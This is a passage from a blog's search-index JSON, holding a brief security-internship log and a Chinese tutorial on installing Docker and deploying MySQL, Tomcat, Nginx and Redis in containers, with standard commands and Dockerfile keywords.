[{"title":"Fuzzing_study","url":"/2023/03/08/Fuzzing-study/","content":""},{"title":"internship_record","url":"/2023/03/14/internship-record/","content":"<h2 id=\"三月\"><a href=\"#三月\" class=\"headerlink\" title=\"三月\"></a>三月</h2><h3 id=\"15日\"><a href=\"#15日\" class=\"headerlink\" title=\"15日\"></a>15日</h3><p>summary：第一天入职 了解了请假、补假的流程，对工作稍微有了些数。对保密有了一定的了解。</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">事情</th>\n<th align=\"center\">完成情况</th>\n<th align=\"center\">备注</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">url跳转漏洞验证+报告</td>\n<td align=\"center\">共写22条报告</td>\n<td align=\"center\"></td>\n</tr>\n</tbody></table>\n","tags":["日常记录 安全服务实习生"]},{"title":"docker use","url":"/2023/03/01/docker/","content":"<h1 id=\"Docker学习\"><a href=\"#Docker学习\" class=\"headerlink\" title=\"Docker学习\"></a>Docker学习</h1><p>对应大纲：<img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301085455109.png\" alt=\"image-20230301085455109\" style=\"zoom:25%;\" /></p>\n<h3 id=\"1、初识DOCKER\"><a href=\"#1、初识DOCKER\" class=\"headerlink\" title=\"1、初识DOCKER\"></a>1、初识DOCKER</h3><h5 id=\"Docker安装\"><a href=\"#Docker安装\" class=\"headerlink\" title=\"Docker安装\"></a>Docker安装</h5><p>三个环境：开发环境、测试环境、生产环境</p>\n<img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301085726456.png\" alt=\"image-20230301085726456\" style=\"zoom: 25%;\" />\n\n<p>环境不同可能会造成问题，手动迁移很麻烦。</p>\n<p>可以使用容器来迁移环境，解决软件跨环境迁移问题。</p>\n<p>Docker概念：Docker是一个开源的应用容器引擎，容器完全是使用沙箱机制，之间相互隔离，容器性能开销低。分为CE版和EE版</p>\n<p>安装docker，本次学习docker安装在centos7上</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 1、yum 包更新到最新 </span></span><br><span class=\"line\">yum update</span><br><span class=\"line\"><span class=\"comment\"># 2、安装需要的软件包， yum-util 提供yum-config-manager功能，另外两个是devicemapper驱动依赖的 </span></span><br><span class=\"line\">yum install -y yum-utils device-mapper-persistent-data lvm2</span><br><span class=\"line\"><span class=\"comment\"># 3、 设置yum源</span></span><br><span class=\"line\">yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo</span><br><span class=\"line\"><span class=\"comment\"># 4、 安装docker，出现输入的界面都按 y </span></span><br><span class=\"line\">yum install -y docker-ce</span><br><span class=\"line\"><span class=\"comment\"># 5、 查看docker版本，验证是否验证成功</span></span><br><span class=\"line\">docker -v</span><br></pre></td></tr></table></figure>\n\n<img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301092147712.png\" alt=\"image-20230301092147712\"  />\n\n<h5 id=\"Docker架构\"><a href=\"#Docker架构\" class=\"headerlink\" title=\"Docker架构\"></a>Docker架构</h5><p>图片示例：<img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301092338599.png\" alt=\"image-20230301092338599\" style=\"zoom: 33%;\" /></p>\n<p>对应概念：</p>\n<ul>\n<li><p>镜像（Image）：Docker 镜像（Image），就相当于是 一个 root 文件系统。比如官方镜像 ubuntu:16.04 就包 含了完整的一套 Ubuntu16.04 最小系统的 root 文件系 统。 </p>\n</li>\n<li><p>容器（Container）：镜像（Image）和容器（Contain er）的关系，就像是面向对象程序设计中的类和对象一 样，镜像是静态的定义，容器是镜像运行时的实体。容 器可以被创建、启动、停止、删除、暂停等。</p>\n</li>\n</ul>\n<p>仓库（Repository）：仓库可看成一个代码控制中心， 用来保存镜像</p>\n<h5 id=\"配置Docker镜像加速器\"><a href=\"#配置Docker镜像加速器\" class=\"headerlink\" title=\"配置Docker镜像加速器\"></a>配置Docker镜像加速器</h5><p>使用阿里云镜像加速器</p>\n<p>修改daemon配置文件&#x2F;etc&#x2F;docker&#x2F;daemon.json来使用加速器</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo <span class=\"built_in\">mkdir</span> -p /etc/docker</span><br><span class=\"line\">sudo <span class=\"built_in\">tee</span> /etc/docker/daemon.json &lt;&lt;-<span class=\"string\">&#x27;EOF&#x27;</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"string\">&quot;registry-mirrors&quot;</span>: [<span class=\"string\">&quot;https://5zu0nxqo.mirror.aliyuncs.com&quot;</span>]</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">EOF</span><br><span class=\"line\">sudo systemctl daemon-reload</span><br><span class=\"line\">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301093225304.png\" alt=\"image-20230301093225304\"></p>\n<p>完成</p>\n<h3 id=\"2、Docker命令\"><a href=\"#2、Docker命令\" class=\"headerlink\" title=\"2、Docker命令\"></a>2、Docker命令</h3><h5 id=\"Docker服务相关命令\"><a href=\"#Docker服务相关命令\" class=\"headerlink\" title=\"Docker服务相关命令\"></a>Docker服务相关命令</h5><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">启动docker服务:systemctl start docker </span><br><span class=\"line\">停止docker服务:systemctl stop docker </span><br><span class=\"line\">重启docker服务:systemctl restart docker</span><br><span class=\"line\">查看docker服务状态:systemctl status docker </span><br><span class=\"line\">设置开机启动docker服务:systemctl enable docker</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"Docker镜像相关命令\"><a href=\"#Docker镜像相关命令\" class=\"headerlink\" title=\"Docker镜像相关命令\"></a>Docker镜像相关命令</h5><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">查看镜像: 查看本地所有的镜像</span><br><span class=\"line\">docker images</span><br><span class=\"line\">docker images –q <span class=\"comment\"># 查看所用镜像的id</span></span><br><span class=\"line\"></span><br><span class=\"line\">搜索镜像:从网络中查找需要的镜像</span><br><span class=\"line\">docker search 镜像名称</span><br><span class=\"line\"></span><br><span class=\"line\">拉取镜像:从Docker仓库下载镜像到本地，镜像名称格式为 名称:版本号，如果版本号不指定则是最新的版本。</span><br><span class=\"line\">如果不知道镜像版本，可以去docker hub 搜索对应镜像查看。</span><br><span class=\"line\">docker pull 镜像名称 eg:docker pull redis:3.2</span><br><span class=\"line\"></span><br><span class=\"line\">删除镜像: 删除本地镜像</span><br><span class=\"line\">docker rmi 镜像<span class=\"built_in\">id</span> <span class=\"comment\"># 删除指定本地镜像</span></span><br><span class=\"line\">docker rmi `docker images -q` <span class=\"comment\"># 删除所有本地镜像</span></span><br></pre></td></tr></table></figure>\n\n<p>想要看镜像有哪些版本可以去dockerhub：<a href=\"https://hub.docker.com/\">https://hub.docker.com/</a></p>\n<h5 id=\"Docker容器相关命令\"><a href=\"#Docker容器相关命令\" class=\"headerlink\" title=\"Docker容器相关命令\"></a>Docker容器相关命令</h5><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">查看容器</span><br><span class=\"line\">docker ps <span class=\"comment\"># 查看正在运行的容器</span></span><br><span class=\"line\">docker ps –a <span class=\"comment\"># 查看所有容器</span></span><br><span class=\"line\"></span><br><span class=\"line\">创建容器</span><br><span class=\"line\">docker run 参数(可以使用docker run --<span class=\"built_in\">help</span>看对应说明)</span><br><span class=\"line\">-i：保持容器运行。通常与 -t 同时使用。加入it这两个参数后，容器创建后自动进入容器中，退出容器后，容器自动关闭。</span><br><span class=\"line\">• -t：为容器重新分配一个伪输入终端，通常与 -i 同时使用。</span><br><span class=\"line\">• -d：以守护（后台）模式运行容器。创建一个容器在后台运行，需要使用docker <span class=\"built_in\">exec</span> 进入容器。退出后，容器不会关闭。</span><br><span class=\"line\">• -it 创建的容器一般称为交互式容器，-<span class=\"built_in\">id</span> 创建的容器一般称为守护式容器</span><br><span class=\"line\">• --name：为创建的容器命名</span><br><span class=\"line\">docker run -it --name=cl centos:7 /bin/bash</span><br><span class=\"line\">docker run -<span class=\"built_in\">id</span> --name=c2 centos:7 </span><br><span class=\"line\"></span><br><span class=\"line\">进入容器</span><br><span class=\"line\">docker <span class=\"built_in\">exec</span> 参数 <span class=\"comment\"># 退出容器，容器不会关闭</span></span><br><span class=\"line\"></span><br><span class=\"line\">启动容器</span><br><span class=\"line\">docker start 容器名称</span><br><span class=\"line\"></span><br><span class=\"line\">停止容器</span><br><span class=\"line\">docker stop 容器名</span><br><span class=\"line\"></span><br><span class=\"line\">删除容器</span><br><span class=\"line\">docker <span class=\"built_in\">rm</span> 容器名称</span><br><span class=\"line\"></span><br><span class=\"line\">查看容器信息</span><br><span class=\"line\">docker inspect 容器名称</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3、Docker容器的数据卷\"><a href=\"#3、Docker容器的数据卷\" class=\"headerlink\" title=\"3、Docker容器的数据卷\"></a>3、Docker容器的数据卷</h3><h5 id=\"数据卷概念及作用\"><a href=\"#数据卷概念及作用\" class=\"headerlink\" title=\"数据卷概念及作用\"></a>数据卷概念及作用</h5><p>问题：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Docker 容器删除后，在容器中产生的数据也会随之销毁 </span><br><span class=\"line\">Docker 容器和外部机器可以直接交换文件吗？ </span><br><span class=\"line\">容器之间想要进行数据交互？</span><br></pre></td></tr></table></figure>\n\n<p>数据卷：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">数据卷是宿主机中的一个目录或文件</span><br><span class=\"line\">当容器目录和数据卷目录绑定后，对方的修改会立即同步</span><br><span class=\"line\">一个数据卷可以被多个容器同时挂载</span><br><span class=\"line\">一个容器也可以被挂载多个数据卷</span><br></pre></td></tr></table></figure>\n\n<p>数据卷作用：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">容器数据持久化 </span><br><span class=\"line\">外部机器和容器间接通信 </span><br><span class=\"line\">容器之间数据交换</span><br></pre></td></tr></table></figure>\n\n\n\n<h5 id=\"配置数据卷\"><a href=\"#配置数据卷\" class=\"headerlink\" title=\"配置数据卷\"></a>配置数据卷</h5><p>创建启动容器时，使用 –v 参数 设置数据卷 </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run ... –v 宿主机目录(文件):容器内目录(文件) ...  </span><br><span class=\"line\">注意事项： 1. 目录必须是绝对路径 2. 如果目录不存在，会自动创建 3. 可以挂载多个数据卷</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301101912652.png\" alt=\"image-20230301101912652\"></p>\n<p>可以看到能够同步，可以简单理解为共享文件夹</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301103733215.png\" alt=\"image-20230301103733215\"></p>\n<p><strong>如果忘了对应的数据卷可以用inspect看</strong></p>\n<h5 id=\"数据卷容器\"><a href=\"#数据卷容器\" class=\"headerlink\" title=\"数据卷容器\"></a>数据卷容器</h5><p>多容器进行数据交换 1. 多个容器挂载同一个数据卷 2. 数据卷容器</p>\n<img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301102705638.png\" alt=\"image-20230301102705638\" style=\"zoom: 67%;\" />\n\n<h5 id=\"配置数据卷容器\"><a href=\"#配置数据卷容器\" class=\"headerlink\" title=\"配置数据卷容器\"></a>配置数据卷容器</h5><p>1、创建启动c3数据卷容器，使用 –v 参数 设置数据卷 </p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run –it --name=c3 –v /volume centos:7 /bin/bash  </span><br></pre></td></tr></table></figure>\n\n<p>2、创建启动 c1 c2 容器，使用 –-volumes-from 参数 设置数据卷</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run –it --name=c1 --volumes-from c3 centos:7 /bin/bash </span><br><span class=\"line\">docker run –it --name=c2 --volumes-from c3 centos:7 /bin/bash </span><br></pre></td></tr></table></figure>\n\n<h3 id=\"4、Docker应用部署\"><a href=\"#4、Docker应用部署\" class=\"headerlink\" title=\"4、Docker应用部署\"></a>4、Docker应用部署</h3><h5 id=\"MySql部署：\"><a href=\"#MySql部署：\" class=\"headerlink\" title=\"MySql部署：\"></a>MySql部署：</h5><p>需求：在Docker容器中部署MySQL，并通过外部mysql客户端操作MySQL Server。</p>\n<p>案例：① 搜索mysql镜像 ② 拉取mysql镜像 ③ 创建容器 ④ 操作容器中的mysql</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">当容器中的网络服务需要被外部机器访问时，可以将容器中提供服务的端口映射到宿主机的端口上。外部机 器访问宿主机的该端口，从而间接访问容器的服务。 </span><br><span class=\"line\"></span><br><span class=\"line\">这种操作称为：端口映射</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301105421936.png\" alt=\"image-20230301105421936\"></p>\n<ol>\n<li>搜索mysql镜像</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker search mysql</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>拉取mysql镜像</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker pull mysql:5.6</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>创建容器，设置端口映射、目录映射</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">在/root目录下创建mysql目录用于存储mysql数据信息</span></span><br><span class=\"line\">mkdir ~/mysql</span><br><span class=\"line\">cd ~/mysql</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run -id \\</span><br><span class=\"line\">-p 3307:3306 \\</span><br><span class=\"line\">--name=c_mysql \\</span><br><span class=\"line\">-v $PWD/conf:/etc/mysql/conf.d \\</span><br><span class=\"line\">-v $PWD/logs:/logs \\</span><br><span class=\"line\">-v $PWD/data:/var/lib/mysql \\</span><br><span class=\"line\">-e MYSQL_ROOT_PASSWORD=123456 \\</span><br><span class=\"line\">mysql:5.6</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>参数说明：<ul>\n<li><strong>-p 3307:3306</strong>：将容器的 3306 端口映射到宿主机的 3307 端口。</li>\n<li><strong>-v $PWD&#x2F;conf:&#x2F;etc&#x2F;mysql&#x2F;conf.d</strong>：将主机当前目录下的 conf&#x2F;my.cnf 挂载到容器的 &#x2F;etc&#x2F;mysql&#x2F;my.cnf。配置目录</li>\n<li><strong>-v $PWD&#x2F;logs:&#x2F;logs</strong>：将主机当前目录下的 logs 目录挂载到容器的 &#x2F;logs。日志目录</li>\n<li><strong>-v $PWD&#x2F;data:&#x2F;var&#x2F;lib&#x2F;mysql</strong> ：将主机当前目录下的data目录挂载到容器的 &#x2F;var&#x2F;lib&#x2F;mysql 。数据目录</li>\n<li><strong>-e MYSQL_ROOT_PASSWORD&#x3D;123456：</strong>初始化 root 用户的密码。</li>\n</ul>\n</li>\n</ul>\n<ol start=\"4\">\n<li>进入容器，操作mysql</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker exec –it c_mysql /bin/bash</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301115710533.png\" alt=\"image-20230301115710533\"></p>\n<ol start=\"5\">\n<li>使用外部机器连接容器中的mysql</li>\n</ol>\n<h5 id=\"部署Tomcat\"><a href=\"#部署Tomcat\" class=\"headerlink\" title=\"部署Tomcat\"></a>部署Tomcat</h5><p>要求：在Docker容器中部署Tomcat，并通过外部机器访问Tomcat部署的项目。</p>\n<p>实现步骤 ① 搜索tomcat镜像 ② 拉取tomcat镜像 ③ 创建容器 ④ 部署项目 ⑤ 测试访问</p>\n<ol>\n<li>搜索tomcat镜像</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker search tomcat</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>拉取tomcat镜像</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker pull tomcat</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>创建容器，设置端口映射、目录映射</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">在/root目录下创建tomcat目录用于存储tomcat数据信息</span></span><br><span class=\"line\">mkdir ~/tomcat</span><br><span class=\"line\">cd ~/tomcat</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run -id --name=c_tomcat \\</span><br><span class=\"line\">-p 8080:8080 \\</span><br><span class=\"line\">-v $PWD:/usr/local/tomcat/webapps \\</span><br><span class=\"line\">tomcat </span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><p>参数说明：</p>\n<ul>\n<li><p><strong>-p 8080:8080：</strong>将容器的8080端口映射到主机的8080端口</p>\n<p><strong>-v $PWD:&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps：</strong>将主机中当前目录挂载到容器的webapps</p>\n</li>\n</ul>\n</li>\n</ul>\n<ol start=\"4\">\n<li><p>使用外部机器访问tomcat</p>\n<img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301141233554.png\" alt=\"image-20230301141233554\" style=\"zoom:50%;\" />\n\n<p>成功</p>\n</li>\n</ol>\n<h5 id=\"部署Nginx\"><a href=\"#部署Nginx\" class=\"headerlink\" title=\"部署Nginx\"></a>部署Nginx</h5><p>需求：在Docker容器中部署Nginx，并通过外部机器访问Nginx</p>\n<p>步骤：① 搜索Nginx镜像 ② 拉取Nginx镜像 ③ 创建容器 ④ 测试访问</p>\n<ol>\n<li>搜索nginx镜像</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker search nginx</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>拉取nginx镜像</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker pull nginx</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>创建容器，设置端口映射、目录映射</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">在/root目录下创建nginx目录用于存储nginx数据信息</span></span><br><span class=\"line\">mkdir ~/nginx</span><br><span class=\"line\">cd ~/nginx</span><br><span class=\"line\">mkdir conf</span><br><span class=\"line\">cd conf</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">在~/nginx/conf/下创建nginx.conf文件,粘贴下面内容</span></span><br><span class=\"line\">vim nginx.conf</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">user  nginx;</span><br><span class=\"line\">worker_processes  1;</span><br><span class=\"line\"></span><br><span class=\"line\">error_log  /var/log/nginx/error.log warn;</span><br><span class=\"line\">pid        /var/run/nginx.pid;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">events &#123;</span><br><span class=\"line\">    worker_connections  1024;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">http &#123;</span><br><span class=\"line\">    include       /etc/nginx/mime.types;</span><br><span class=\"line\">    default_type  application/octet-stream;</span><br><span class=\"line\"></span><br><span class=\"line\">    log_format  main  &#x27;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#x27;</span><br><span class=\"line\">                      &#x27;$status $body_bytes_sent &quot;$http_referer&quot; &#x27;</span><br><span class=\"line\">                      &#x27;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&#x27;;</span><br><span class=\"line\"></span><br><span class=\"line\">    access_log  /var/log/nginx/access.log  main;</span><br><span class=\"line\"></span><br><span class=\"line\">    sendfile        on;</span><br><span class=\"line\">    #tcp_nopush     on;</span><br><span class=\"line\"></span><br><span class=\"line\">    keepalive_timeout  65;</span><br><span class=\"line\"></span><br><span class=\"line\">    #gzip  on;</span><br><span class=\"line\"></span><br><span class=\"line\">    include /etc/nginx/conf.d/*.conf;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run -id --name=c_nginx \\</span><br><span class=\"line\">-p 80:80 \\</span><br><span class=\"line\">-v $PWD/conf/nginx.conf:/etc/nginx/nginx.conf \\</span><br><span class=\"line\">-v $PWD/logs:/var/log/nginx \\</span><br><span class=\"line\">-v $PWD/html:/usr/share/nginx/html \\</span><br><span class=\"line\">nginx</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>参数说明：<ul>\n<li><strong>-p 80:80</strong>：将容器的 80端口映射到宿主机的 80 端口。</li>\n<li><strong>-v $PWD&#x2F;conf&#x2F;nginx.conf:&#x2F;etc&#x2F;nginx&#x2F;nginx.conf</strong>：将主机当前目录下的 &#x2F;conf&#x2F;nginx.conf 挂载到容器的 :&#x2F;etc&#x2F;nginx&#x2F;nginx.conf。配置目录</li>\n<li><strong>-v $PWD&#x2F;logs:&#x2F;var&#x2F;log&#x2F;nginx</strong>：将主机当前目录下的 logs 目录挂载到容器的&#x2F;var&#x2F;log&#x2F;nginx。日志目录</li>\n</ul>\n</li>\n</ul>\n<ol start=\"4\">\n<li><p>使用外部机器访问nginx</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301142036233.png\" alt=\"image-20230301142036233\"></p>\n</li>\n</ol>\n<h5 id=\"部署Redis\"><a href=\"#部署Redis\" class=\"headerlink\" title=\"部署Redis\"></a>部署Redis</h5><p>需求：在Docker容器中部署Redis，并通过外部机器访问Redis。</p>\n<p>实现步骤 ① 搜索Redis镜像 ② 拉取Redis镜像 ③ 创建容器 ④ 测试访问</p>\n<ol>\n<li>搜索redis镜像</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker search redis</span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li>拉取redis镜像</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker pull redis:5.0</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>创建容器，设置端口映射</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run -id --name=c_redis -p 6379:6379 redis:5.0</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li>使用外部机器连接redis</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">./redis-cli.exe -h 192.168.149.135 -p 6379</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301142459588.png\" alt=\"image-20230301142459588\"></p>\n<h3 id=\"5、Dockerfile\"><a href=\"#5、Dockerfile\" class=\"headerlink\" title=\"5、Dockerfile\"></a>5、Dockerfile</h3><h5 id=\"Docker镜像原理\"><a href=\"#Docker镜像原理\" class=\"headerlink\" title=\"Docker镜像原理\"></a>Docker镜像原理</h5><p>问题：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Docker 镜像本质是什么？</span><br><span class=\"line\">Docker 中一个centos镜像为什么只有200MB，而一个centos操作系统的iso文件要几个个G？</span><br><span class=\"line\">Docker 中一个tomcat镜像为什么有500MB，而一个tomcat安装包只有70多MB？</span><br></pre></td></tr></table></figure>\n\n<p>理论知识：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">操作系统组成部分：</span><br><span class=\"line\">进程通信子系统</span><br><span class=\"line\">内存管理子系统</span><br><span class=\"line\">备管理子系统</span><br><span class=\"line\">文件管理子系统</span><br><span class=\"line\">网络通信子系统</span><br><span class=\"line\">作业控制子系统</span><br><span class=\"line\">进程调度子系统</span><br><span class=\"line\"></span><br><span class=\"line\">Linux文件系统由bootfs和rootfs两部分组成</span><br><span class=\"line\">• bootfs：包含bootloader（引导加载程序）和 kernel（内核）</span><br><span class=\"line\">• rootfs： root文件系统，包含的就是典型 Linux 系统中的/dev，/proc，/bin，/etc等标准目录和文件</span><br><span class=\"line\">• 不同的linux发行版，bootfs基本一样，而rootfs不同，如ubuntu，centos等</span><br></pre></td></tr></table></figure>\n\n<img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301143313641.png\" alt=\"image-20230301143313641\" style=\"zoom:67%;\" />\n\n<p>问题回答：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">1. Docker 镜像本质是什么？</span><br><span class=\"line\">• 是一个分层文件系统</span><br><span class=\"line\">2. Docker 中一个centos镜像为什么只有200MB，而一个centos操作系统的iso文件要几个个G？</span><br><span class=\"line\">• Centos的iso镜像文件包含bootfs和rootfs，而docker的centos镜像复用操作系统的bootfs，只有rootfs和其他镜像层</span><br><span class=\"line\">3. Docker 中一个tomcat镜像为什么有500MB，而一个tomcat安装包只有70多MB？</span><br><span class=\"line\">• 由于docker中镜像是分层的，tomcat虽然只有70多MB，但他需要依赖于父镜像和基础镜像，所有整个对外暴露的tomcat镜像大小500多MB</span><br></pre></td></tr></table></figure>\n\n<p>docker inspect tomcat 效果：</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301143908837.png\" alt=\"image-20230301143908837\"></p>\n<h5 id=\"Docker镜像制作\"><a href=\"#Docker镜像制作\" class=\"headerlink\" title=\"Docker镜像制作\"></a>Docker镜像制作</h5><img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230301144055969.png\" alt=\"image-20230301144055969\" style=\"zoom:50%;\" />\n\n<p> 注意：</p>\n<ol>\n<li>自己制作镜像时，目录挂载不会生效，其它会保存</li>\n</ol>\n<h5 id=\"Dockerfile概念\"><a href=\"#Dockerfile概念\" class=\"headerlink\" title=\"Dockerfile概念\"></a>Dockerfile概念</h5><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Dockerfile 是一个文本文件 </span><br><span class=\"line\">包含了一条条的指令 </span><br><span class=\"line\">每一条指令构建一层，基于基础镜像，最终构建出一个新的镜像 </span><br><span class=\"line\">对于开发人员：可以为开发团队提供一个完全一致的开发环境 </span><br><span class=\"line\">对于测试人员：可以直接拿开发时所构建的镜像或者通过Dockerfile文件 构建一个新的镜像开始工作了 </span><br><span class=\"line\">对于运维人员：在部署时，可以实现应用的无缝移</span><br></pre></td></tr></table></figure>\n\n<p>参考网站：<a href=\"https://hub.docker.com/\">https://hub.docker.com</a></p>\n<h5 id=\"Dockerfile关键字\"><a href=\"#Dockerfile关键字\" class=\"headerlink\" title=\"Dockerfile关键字\"></a>Dockerfile关键字</h5><table>\n<thead>\n<tr>\n<th>关键字</th>\n<th>作用</th>\n<th>备注</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>FROM</td>\n<td>指定父镜像</td>\n<td>指定dockerfile基于那个image构建</td>\n</tr>\n<tr>\n<td>MAINTAINER</td>\n<td>作者信息</td>\n<td>用来标明这个dockerfile谁写的</td>\n</tr>\n<tr>\n<td>LABEL</td>\n<td>标签</td>\n<td>用来标明dockerfile的标签 可以使用Label代替Maintainer 最终都是在docker image基本信息中可以查看</td>\n</tr>\n<tr>\n<td>RUN</td>\n<td>执行命令</td>\n<td>执行一段命令 默认是&#x2F;bin&#x2F;sh 格式: RUN command 或者 RUN [“command” , “param1”,”param2”]</td>\n</tr>\n<tr>\n<td>CMD</td>\n<td>容器启动命令</td>\n<td>提供启动容器时候的默认命令 和ENTRYPOINT配合使用.格式 CMD command param1 param2 或者 CMD [“command” , “param1”,”param2”]</td>\n</tr>\n<tr>\n<td>ENTRYPOINT</td>\n<td>入口</td>\n<td>一般在制作一些执行就关闭的容器中会使用</td>\n</tr>\n<tr>\n<td>COPY</td>\n<td>复制文件</td>\n<td>build的时候复制文件到image中</td>\n</tr>\n<tr>\n<td>ADD</td>\n<td>添加文件</td>\n<td>build的时候添加文件到image中 不仅仅局限于当前build上下文 可以来源于远程服务</td>\n</tr>\n<tr>\n<td>ENV</td>\n<td>环境变量</td>\n<td>指定build时候的环境变量 可以在启动的容器的时候 通过-e覆盖 格式ENV name&#x3D;value</td>\n</tr>\n<tr>\n<td>ARG</td>\n<td>构建参数</td>\n<td>构建参数 只在构建的时候使用的参数 如果有ENV 那么ENV的相同名字的值始终覆盖arg的参数</td>\n</tr>\n<tr>\n<td>VOLUME</td>\n<td>定义外部可以挂载的数据卷</td>\n<td>指定build的image那些目录可以启动的时候挂载到文件系统中 启动容器的时候使用 -v 绑定 